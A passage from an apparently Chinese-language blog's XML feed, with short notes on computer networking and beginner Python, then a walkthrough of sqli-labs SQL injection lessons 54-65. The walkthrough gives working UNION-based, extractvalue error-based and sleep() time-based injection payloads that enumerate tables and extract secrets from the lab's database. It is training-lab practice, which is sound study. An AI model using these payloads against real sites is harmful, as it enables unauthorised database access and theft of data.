alt="image-20210503191947986"></p><p>网络体系结构是从<strong>功能</strong>上描述计算机网络结构。</p><p>计算机网络体系结构简称网络体系结构是<strong>分层结构</strong>。</p><p>每层遵循某个/些<strong>网络协议</strong>以完成本层功能。</p><p><strong>计算机网络体系结构</strong>是计算机网络的<strong>各层及其协议</strong>的集合。</p><p>第n层在向η+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能。</p><p>仅仅在<strong>相邻层间有接口</strong>，且所提供服务的具体实现细节对上一层完全屏蔽。</p><p>体系结构是<strong>抽象</strong>的，而实现是指能运行的一些软件和硬件。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络梳理</title>
      <link href="/2021/05/03/ji-suan-ji-wang-luo-shu-li/"/>
      <url>/2021/05/03/ji-suan-ji-wang-luo-shu-li/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络学习"><a href="#计算机网络学习" class="headerlink" title="计算机网络学习"></a>计算机网络学习</h1><p>计算机网络梳理</p><span id="more"></span><h2 id="一、TCP-IP体系认识"><a href="#一、TCP-IP体系认识" class="headerlink" title="一、TCP/IP体系认识"></a><strong>一、TCP/IP体系认识</strong></h2><h2 id="二、数据链路层"><a href="#二、数据链路层" class="headerlink" title="二、数据链路层"></a><strong>二、数据链路层</strong></h2><h3 id="1-以太网帧的格式"><a href="#1-以太网帧的格式" class="headerlink" title="1.以太网帧的格式"></a><strong>1.以太网帧的格式</strong></h3><h3 id="2-MTU概念"><a href="#2-MTU概念" class="headerlink" title="2.MTU概念"></a><strong>2.MTU概念</strong></h3><h3 id="3-ARP-RARP协议（地址解析-逆地址解析）"><a href="#3-ARP-RARP协议（地址解析-逆地址解析）" class="headerlink" title="3.ARP/RARP协议（地址解析/逆地址解析）"></a><strong>3.ARP/RARP协议</strong>（地址解析/逆地址解析）</h3><h2 id="三、网络层"><a href="#三、网络层" class="headerlink" title="三、网络层"></a><strong>三、网络层</strong></h2><h3 id="1-IP协议"><a href="#1-IP协议" class="headerlink" title="1.IP协议"></a><strong>1.IP协议</strong></h3><p>掌握IP首部格式；16位分片标识、DF不分片标识、MF更多分片标志、13位片偏移、8位生存时间TTL、16位的首部检验和等</p><h3 id="2-ICMP协议"><a href="#2-ICMP协议" class="headerlink" title="2.ICMP协议"></a><strong>2.ICMP协议</strong></h3><p>报文格式:查询+差错、</p><p>​      2种查询报文+5种差错报文</p><h2 id="四、传输层"><a href="#四、传输层" class="headerlink" title="四、传输层"></a><strong>四、传输层</strong></h2><h3 id="UDP协议："><a href="#UDP协议：" class="headerlink" title="UDP协议："></a>UDP协议：</h3><p>包括特点+首部各个字段</p><h3 id="TCP协议："><a href="#TCP协议：" class="headerlink" title="TCP协议："></a>TCP协议：</h3><p>特点+首部字段+可靠机制</p><h3 id="TCP链接控制："><a href="#TCP链接控制：" class="headerlink" title="TCP链接控制："></a>TCP链接控制：</h3><p>三次握手、四次挥手、同时打开、同时关闭、半关闭</p><h3 id="TCP流量控制机制："><a href="#TCP流量控制机制：" class="headerlink" title="TCP流量控制机制："></a>TCP流量控制机制：</h3><p>滑动窗口、慢启动、拥塞避免、快速重传、快速恢复</p><h3 id="TCP超时重传机制："><a href="#TCP超时重传机制：" class="headerlink" title="TCP超时重传机制："></a>TCP超时重传机制：</h3><p>各种定时器</p><p>为什么三次握手 四次挥手？</p><p>为什么TCP、UDP存在伪包头</p><h2 id="五、应用层"><a href="#五、应用层" class="headerlink" title="五、应用层"></a><strong>五、应用层</strong></h2><h3 id="DNS协议："><a href="#DNS协议：" class="headerlink" title="DNS协议："></a>DNS协议：</h3><p>名字空间、DNS指针查询（反向查找或逆向解析）基本原理、DNS缓存</p><h3 id="FTP协议：网络界的活化石"><a href="#FTP协议：网络界的活化石" class="headerlink" title="FTP协议：网络界的活化石"></a>FTP协议：网络界的活化石</h3><p>俩条连接：控制连接+数据连接</p><p>俩种工作模式：PASV+PORT</p><p>各种FTP指令和响应码</p><p>FTP断点续传、匿名FTP协议</p><h3 id="HTTP协议："><a href="#HTTP协议：" class="headerlink" title="HTTP协议："></a>HTTP协议：</h3><p>1.报文格式：请求报文、响应报文、<strong>请求头各种字段、响应头各种字段</strong>、</p><p>2.http状态码</p><h3 id="HTTPS协议："><a href="#HTTPS协议：" class="headerlink" title="HTTPS协议："></a>HTTPS协议：</h3><p>1.https详细的握手过程</p><p>2.摘要算法、数字签名、数字证书的原理和过程</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习</title>
      <link href="/2021/05/01/python-xue-xi-3/"/>
      <url>/2021/05/01/python-xue-xi-3/</url>
      
        <content type="html"><![CDATA[<h1 id="小白初识python（3）"><a href="#小白初识python（3）" class="headerlink" title="小白初识python（3）"></a>小白初识python（3）</h1><span id="more"></span><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501205624337.png" alt="image-20210501205624337"></p><p><img src="/2021/05/01/python-xue-xi-3/image-20210501205704586.png" alt="image-20210501205704586"></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210501210020338.png" alt="image-20210501210020338"></p><h2 id="写什么样的函数"><a href="#写什么样的函数" class="headerlink" title="写什么样的函数"></a>写什么样的函数</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501210249269.png" alt="image-20210501210249269"></p><p><img src="/2021/05/01/python-xue-xi-3/image-20210501210553749.png" alt="image-20210501210553749"></p><h2 id="可以整合进函数"><a href="#可以整合进函数" class="headerlink" title="可以整合进函数"></a>可以整合进函数</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501210921150.png" alt="image-20210501210921150"></p><h2 id="引用库中的函数与对象"><a href="#引用库中的函数与对象" class="headerlink" title="引用库中的函数与对象"></a>引用库中的函数与对象</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501211159815.png" alt="image-20210501211159815"></p><p>使用库中的对象，要进行实例化</p><h2 id="函数房间内的秘密"><a href="#函数房间内的秘密" class="headerlink" title="函数房间内的秘密"></a>函数房间内的秘密</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501211428693.png" alt="image-20210501211428693"></p><h1 id="解决问题的思维"><a href="#解决问题的思维" class="headerlink" title="解决问题的思维"></a>解决问题的思维</h1><p><img src="/2021/05/01/python-xue-xi-3/image-20210501211712384.png" alt="image-20210501211712384"></p><h2 id="真实问题的基本思路"><a href="#真实问题的基本思路" class="headerlink" title="真实问题的基本思路"></a>真实问题的基本思路</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501212637505.png" alt="image-20210501212637505"></p><h3 id="确定函数间的数据类型和传递方式"><a href="#确定函数间的数据类型和传递方式" class="headerlink" title="确定函数间的数据类型和传递方式"></a>确定函数间的数据类型和传递方式</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210501212742493.png" alt="image-20210501212742493"></p><p>第一步：</p><p><img src="/2021/05/01/python-xue-xi-3/image-20210501213353449.png" alt="image-20210501213353449"></p><p>第二步：</p><p><img src="/2021/05/01/python-xue-xi-3/image-20210501215905202.png" alt="image-20210501215905202"></p><p>第三步：规整数据</p><p><img src="/2021/05/01/python-xue-xi-3/image-20210501220755018.png" alt="image-20210501220755018"></p><p>第四步：导出表格</p><p><img src="/2021/05/01/python-xue-xi-3/image-20210501221256119.png" alt="image-20210501221256119"></p><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="什么是容器"><a href="#什么是容器" class="headerlink" title="什么是容器"></a>什么是容器</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501221427455.png" alt="image-20210501221427455"></p><h2 id="四个不同类型容器的特征和基本特性"><a href="#四个不同类型容器的特征和基本特性" class="headerlink" title="四个不同类型容器的特征和基本特性"></a>四个不同类型容器的特征和基本特性</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210501222017176.png" alt="image-20210501222017176"></p><p>列表存放同组数据</p><p>元组存放不同组数据</p><h2 id="一个例子—数据装到容器中"><a href="#一个例子—数据装到容器中" class="headerlink" title="一个例子—数据装到容器中"></a>一个例子—数据装到容器中</h2><h3 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210501222450518.png" alt="image-20210501222450518"></p><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210501222509992.png" alt="image-20210501222509992"></p><p>由于标题与段落中存在空行，导致存在不想要的东西，’’</p><h3 id="整理容器"><a href="#整理容器" class="headerlink" title="整理容器"></a>整理容器</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210501222558862.png" alt="image-20210501222558862"></p><h3 id="描述容器中元素的方法："><a href="#描述容器中元素的方法：" class="headerlink" title="描述容器中元素的方法："></a>描述容器中元素的方法：</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210501222731900.png" alt="image-20210501222731900"></p><h3 id="对整理好的容器进行切片"><a href="#对整理好的容器进行切片" class="headerlink" title="对整理好的容器进行切片"></a>对整理好的容器进行切片</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210502113709445.png" alt="image-20210502113709445"></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="过滤原有容器的数据，构造新的容器"><a href="#过滤原有容器的数据，构造新的容器" class="headerlink" title="过滤原有容器的数据，构造新的容器"></a>过滤原有容器的数据，构造新的容器</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210502113819089.png" alt="image-20210502113819089"></p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p><img src="/2021/05/01/python-xue-xi-3/image-20210502114154163.png" alt="image-20210502114154163"></p><h3 id="整合数据"><a href="#整合数据" class="headerlink" title="整合数据"></a>整合数据</h3><p><img src="/2021/05/01/python-xue-xi-3/image-20210502114351146.png" alt="image-20210502114351146"></p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习</title>
      <link href="/2021/05/01/python-xue-xi-2/"/>
      <url>/2021/05/01/python-xue-xi-2/</url>
      
        <content type="html"><![CDATA[<h1 id="小白初识python（2）"><a href="#小白初识python（2）" class="headerlink" title="小白初识python（2）"></a>小白初识python（2）</h1><span id="more"></span><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="循环的意义"><a href="#循环的意义" class="headerlink" title="循环的意义"></a>循环的意义</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501195013626.png" alt="image-20210501195013626"></p><p><img src="/2021/05/01/python-xue-xi-2/image-20210501195150208.png" alt="image-20210501195150208"></p><h3 id="一堆数据"><a href="#一堆数据" class="headerlink" title="一堆数据"></a>一堆数据</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501195325372.png" alt="image-20210501195325372"></p><h3 id="一堆数据中的每一个"><a href="#一堆数据中的每一个" class="headerlink" title="一堆数据中的每一个"></a>一堆数据中的每一个</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501195517196.png" alt="image-20210501195517196"></p><h3 id="特定的规则"><a href="#特定的规则" class="headerlink" title="特定的规则"></a>特定的规则</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501195726716.png" alt="image-20210501195726716"></p><h2 id="循环的四个应用场景"><a href="#循环的四个应用场景" class="headerlink" title="循环的四个应用场景"></a>循环的四个应用场景</h2><h3 id="使用可迭代对象中的数据"><a href="#使用可迭代对象中的数据" class="headerlink" title="使用可迭代对象中的数据"></a>使用可迭代对象中的数据</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501195933871.png" alt="image-20210501195933871"></p><h3 id="构造-整理容器中的数据"><a href="#构造-整理容器中的数据" class="headerlink" title="构造/整理容器中的数据"></a>构造/整理容器中的数据</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501200309644.png" alt="image-20210501200309644"></p><h3 id="嵌套多重循环"><a href="#嵌套多重循环" class="headerlink" title="嵌套多重循环"></a>嵌套多重循环</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501200431137.png" alt="image-20210501200431137"></p><h3 id="循环中的条件分支"><a href="#循环中的条件分支" class="headerlink" title="循环中的条件分支"></a>循环中的条件分支</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501200519433.png" alt="image-20210501200519433"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2021/05/01/python-xue-xi-2/image-20210501200641924.png" alt="image-20210501200641924"></p><h1 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h1><p><img src="/2021/05/01/python-xue-xi-2/image-20210501200806424.png" alt="image-20210501200806424"></p><h2 id="条件分支阅读规则"><a href="#条件分支阅读规则" class="headerlink" title="条件分支阅读规则"></a>条件分支阅读规则</h2><p><img src="/2021/05/01/python-xue-xi-2/image-20210501201237163.png" alt="image-20210501201237163"></p><p>描述情况发生的边界条件<img src="/2021/05/01/python-xue-xi-2/image-20210501201714782.png" alt="image-20210501201714782"></p><p>被描述的条件都会返回布尔值</p><h2 id="条件边界"><a href="#条件边界" class="headerlink" title="条件边界"></a>条件边界</h2><h3 id="值比较"><a href="#值比较" class="headerlink" title="值比较"></a>值比较</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501202228963.png" alt="image-20210501202228963"></p><h3 id="看结果"><a href="#看结果" class="headerlink" title="看结果"></a>看结果</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501202523156.png" alt="image-20210501202523156"></p><h3 id="猜有无"><a href="#猜有无" class="headerlink" title="猜有无"></a>猜有无</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501202725448.png" alt="image-20210501202725448"></p><h2 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h2><h3 id="if-do-vs-if-else-do"><a href="#if-do-vs-if-else-do" class="headerlink" title="if do  vs  if else do"></a>if do  vs  if else do</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501203041019.png" alt="image-20210501203041019"></p><h3 id="and-or-vs-if-if-…else"><a href="#and-or-vs-if-if-…else" class="headerlink" title="and or  vs  if if …else"></a>and or  vs  if if …else</h3><p><img src="/2021/05/01/python-xue-xi-2/image-20210501203233555.png" alt="image-20210501203233555"></p><p>if/elfi  vs  if/if</p><p><img src="/2021/05/01/python-xue-xi-2/image-20210501203515144.png" alt="image-20210501203515144"></p><p>if/elif读到符合条件的就停止 </p><p>if/if即使读到了符合条件，执行下一个符合条件的仍旧执行</p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习</title>
      <link href="/2021/05/01/python-xue-xi-1/"/>
      <url>/2021/05/01/python-xue-xi-1/</url>
      
        <content type="html"><![CDATA[<h1 id="小白初识python（1）"><a href="#小白初识python（1）" class="headerlink" title="小白初识python（1）"></a>小白初识python（1）</h1><p>麻瓜编程视频</p><span id="more"></span><p>看视频做点笔记，感觉不留点痕迹总感觉收获不大，视频好像有点基础，但还是看看写写吧</p><h2 id="快速学会py四个关键点"><a href="#快速学会py四个关键点" class="headerlink" title="快速学会py四个关键点"></a>快速学会py四个关键点</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501174126930.png" alt="image-20210501174126930"></p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501174654193.png" alt="image-20210501174654193"></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501174845749.png" alt="image-20210501174845749"></p><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501175409596.png" alt="image-20210501175409596"></p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501175700615.png" alt="image-20210501175700615"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501175841078.png" alt="image-20210501175841078"></p><h1 id="数据-1"><a href="#数据-1" class="headerlink" title="数据"></a>数据</h1><p><img src="/2021/05/01/python-xue-xi-1/image-20210501190407874.png" alt="image-20210501190407874"></p><h2 id="数据的类型"><a href="#数据的类型" class="headerlink" title="数据的类型"></a>数据的类型</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a><strong>字符串</strong></h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501190719383.png" alt="image-20210501190719383"></p><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a><strong>数字型</strong></h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501191057541.png" alt="image-20210501191057541"></p><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a><strong>容器</strong></h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501191252044.png" alt="image-20210501191252044"></p><p>集合可以去重</p><h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a><strong>布尔型</strong></h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501191418234.png" alt="image-20210501191418234"></p><p>py严格区分大小写</p><h3 id="NONE"><a href="#NONE" class="headerlink" title="NONE"></a><strong>NONE</strong></h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501191531985.png" alt="image-20210501191531985"></p><h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a><strong>自定义</strong></h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501191638725.png" alt="image-20210501191638725"></p><h2 id="给数据起名字"><a href="#给数据起名字" class="headerlink" title="给数据起名字"></a>给数据起名字</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501192241863.png" alt="image-20210501192241863"></p><h3 id="起名规则"><a href="#起名规则" class="headerlink" title="起名规则"></a><strong>起名规则</strong></h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501192302817.png" alt="image-20210501192302817"></p><h2 id="数据的运算"><a href="#数据的运算" class="headerlink" title="数据的运算"></a>数据的运算</h2><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501192540053.png" alt="image-20210501192540053"></p><h3 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h3><p><img src="/2021/05/01/python-xue-xi-1/image-20210501192726535.png" alt="image-20210501192726535"></p><h3 id="对数据的使用方法和函数"><a href="#对数据的使用方法和函数" class="headerlink" title="对数据的使用方法和函数"></a>对数据的使用方法和函数</h3><p>方法</p><p><img src="/2021/05/01/python-xue-xi-1/image-20210501192901976.png" alt="image-20210501192901976"></p><p>函数</p><p><img src="/2021/05/01/python-xue-xi-1/image-20210501193136237.png" alt="image-20210501193136237"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p><img src="/2021/05/01/python-xue-xi-1/image-20210501193428725.png" alt="image-20210501193428725"></p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs54-65</title>
      <link href="/2021/04/28/sqli-labs54-65/"/>
      <url>/2021/04/28/sqli-labs54-65/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs通关（54-65）"><a href="#sqli-labs通关（54-65）" class="headerlink" title="sqli-labs通关（54-65）"></a>sqli-labs通关（54-65）</h1><p>已知数据库名为challenges，且限制了尝试次数，次数过后会随机生成一个新的表名和密码</p><hr><span id="more"></span><h2 id="Less-54GET-challenge-Union-10-queries-allowed-Variation-1"><a href="#Less-54GET-challenge-Union-10-queries-allowed-Variation-1" class="headerlink" title="Less-54GET - challenge - Union- 10 queries allowed - Variation 1"></a>Less-54GET - challenge - Union- 10 queries allowed - Variation 1</h2><p>单引号报错，–+注释后正常，说明单引号闭合</p><p>order by 到4报错，说明有3列</p><p>基于错误的联合注入</p><p>爆库：额 。。已知库名为challenges</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表：7poqzjt6p4</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs54-65/image-20210428202129314.png" alt="image-20210428202129314"></p><p>爆列：secret_9U56</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='7poqzjt6p4' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs54-65/image-20210428202216222.png" alt="image-20210428202216222"></p><p>爆secret：AtM2570eOgEDCWvQXPfUsZUi</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,(select secret_9U56 from challenges.7poqzjt6p4) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs54-65/image-20210428202447114.png" alt="image-20210428202447114"></p><p>提交后成功</p><h2 id="Less-55GET-challenge-Union-14-queries-allowed-Variation-2"><a href="#Less-55GET-challenge-Union-14-queries-allowed-Variation-2" class="headerlink" title="Less-55GET - challenge - Union- 14 queries allowed - Variation 2"></a>Less-55GET - challenge - Union- 14 queries allowed - Variation 2</h2><p>尝试发现闭合符为），–+注释</p><p>基于错误的联合注入</p><p>爆表：r78tfrwxvr</p><pre class="line-numbers language-none"><code class="language-none">?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆列：secret_ZQ5P</p><pre class="line-numbers language-none"><code class="language-none">?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name='r78tfrwxvr'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆secret：uz7XgCo3x4Z5SCycckVQk6d3</p><pre class="line-numbers language-none"><code class="language-none">?id=-1) union select 1,2,secret_ZQ5P from challenges.r78tfrwxvr--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交后成功<img src="/2021/04/28/sqli-labs54-65/image-20210428203356295.png" alt="image-20210428203356295"></p><h2 id="Less-56GET-challenge-Union-14-queries-allowed-variation-3"><a href="#Less-56GET-challenge-Union-14-queries-allowed-variation-3" class="headerlink" title="Less-56GET - challenge - Union- 14 queries allowed -variation 3"></a>Less-56GET - challenge - Union- 14 queries allowed -variation 3</h2><p>发现闭合符为’),–+注释</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428203547943.png" alt="image-20210428203547943"></p><p>操作同上关</p><h2 id="Less-57GET-challenge-Union-14-queries-allowed-Variation-4"><a href="#Less-57GET-challenge-Union-14-queries-allowed-Variation-4" class="headerlink" title="Less-57GET - challenge - Union- 14 queries allowed - Variation 4"></a>Less-57GET - challenge - Union- 14 queries allowed - Variation 4</h2><p>尝试后发现闭合符为”，–+注释</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428203655191.png" alt="image-20210428203655191"></p><p>其余操作同上</p><h2 id="Less-58GET-challenge-Double-Query-5-queries-allowed-Variation-1"><a href="#Less-58GET-challenge-Double-Query-5-queries-allowed-Variation-1" class="headerlink" title="Less-58GET - challenge - Double Query- 5 queries allowed - Variation 1"></a>Less-58GET - challenge - Double Query- 5 queries allowed - Variation 1</h2><p>只有5次机会</p><p>?id=1’报错，我们进行报错注入</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428203930529.png" alt="image-20210428203930529"></p><p>报表：t2karweg5y</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs54-65/image-20210428204452902.png" alt="image-20210428204452902"></p><p>爆列：secret_WRS2</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='t2karweg5y')))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs54-65/image-20210428204608994.png" alt="image-20210428204608994"></p><p>爆值：IgyoUCcyW5MeuqyrhCKZ2Tjb</p><pre class="line-numbers language-none"><code class="language-none">?id=-1' and extractvalue(1,concat(0x7e,(select secret_WRS2 from challenges.t2karweg5y)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/28/sqli-labs54-65/image-20210428204719447.png" alt="image-20210428204719447"></p><h2 id="Less-59GET-challenge-Double-Query-5-queries-allowed-Variation-2"><a href="#Less-59GET-challenge-Double-Query-5-queries-allowed-Variation-2" class="headerlink" title="Less-59GET - challenge - Double Query- 5 queries allowed - Variation 2"></a>Less-59GET - challenge - Double Query- 5 queries allowed - Variation 2</h2><p>五次机会</p><p>输入?id=1’报错</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428205000984.png" alt="image-20210428205000984"></p><p>数字型注入</p><p>payload中id=-1即可</p><p>其余操作同58关</p><h2 id="Less-60GET-challenge-Double-Query-5-queries-allowed-Variation-3"><a href="#Less-60GET-challenge-Double-Query-5-queries-allowed-Variation-3" class="headerlink" title="Less-60GET - challenge - Double Query- 5 queries allowed - Variation 3"></a>Less-60GET - challenge - Double Query- 5 queries allowed - Variation 3</h2><p>5次机会</p><p>尝试后发现为“）闭合，–+注释</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428205204198.png" alt="image-20210428205204198"></p><p>其余不再赘述，基于错误联合注入即可</p><h2 id="Less-61GET-challenge-Double-Query-5-queries-allowed-Variation-4"><a href="#Less-61GET-challenge-Double-Query-5-queries-allowed-Variation-4" class="headerlink" title="Less-61GET - challenge - Double Query- 5 queries allowed - Variation 4"></a>Less-61GET - challenge - Double Query- 5 queries allowed - Variation 4</h2><p>尝试后发现闭合符为’））,–+注释</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428205350898.png" alt="image-20210428205350898"></p><p>其余不再赘述，基于错误联合注入即可</p><h2 id="Less-62GET-challenge-Blind-130-queries-allowed-variation-1"><a href="#Less-62GET-challenge-Blind-130-queries-allowed-variation-1" class="headerlink" title="Less-62GET - challenge - Blind - 130 queries allowed - variation 1"></a>Less-62GET - challenge - Blind - 130 queries allowed - variation 1</h2><p>130次尝试机会。。。</p><p>闭合符为‘），–+注释</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428205556067.png" alt="image-20210428205556067"></p><p>发现union查询后不回显了，关闭了报错</p><p>测试时间延迟型：</p><pre class="line-numbers language-none"><code class="language-none">?id=1') and sleep(5) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存在明显延迟</p><p>盲注太烦了，就不写了，猜到啥时候了，果然130次没安好心</p><h2 id="Less-63GET-challenge-Blind-130-queries-allowed-Variation-2"><a href="#Less-63GET-challenge-Blind-130-queries-allowed-Variation-2" class="headerlink" title="Less-63GET - challenge - Blind - 130 queries allowed -Variation 2"></a>Less-63GET - challenge - Blind - 130 queries allowed -Variation 2</h2><p>发现闭合符为’，–+注释</p><p>同上关也得时间延迟型盲注</p><h2 id="Less-64GET-challenge-Blind-130-queries-allowed-variation-3"><a href="#Less-64GET-challenge-Blind-130-queries-allowed-variation-3" class="headerlink" title="Less-64GET - challenge - Blind - 130 queries allowed - variation 3"></a>Less-64GET - challenge - Blind - 130 queries allowed - variation 3</h2><p>发现闭合符为）），–+注释</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428210158369.png" alt="image-20210428210158369"></p><p>同上，时间延迟型盲注</p><h2 id="Less-65GET-challenge-Blind-130-queries-allowed-Variation-4"><a href="#Less-65GET-challenge-Blind-130-queries-allowed-Variation-4" class="headerlink" title="Less-65GET - challenge - Blind - 130 queries allowed - Variation 4"></a>Less-65GET - challenge - Blind - 130 queries allowed - Variation 4</h2><p>闭合符为”），–+注释</p><p><img src="/2021/04/28/sqli-labs54-65/image-20210428210311397.png" alt="image-20210428210311397"></p><p>同上时间延迟型盲注</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-page4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlli-labs38-53</title>
      <link href="/2021/04/28/sqli-labs38-53/"/>
      <url>/2021/04/28/sqli-labs38-53/</url>
      
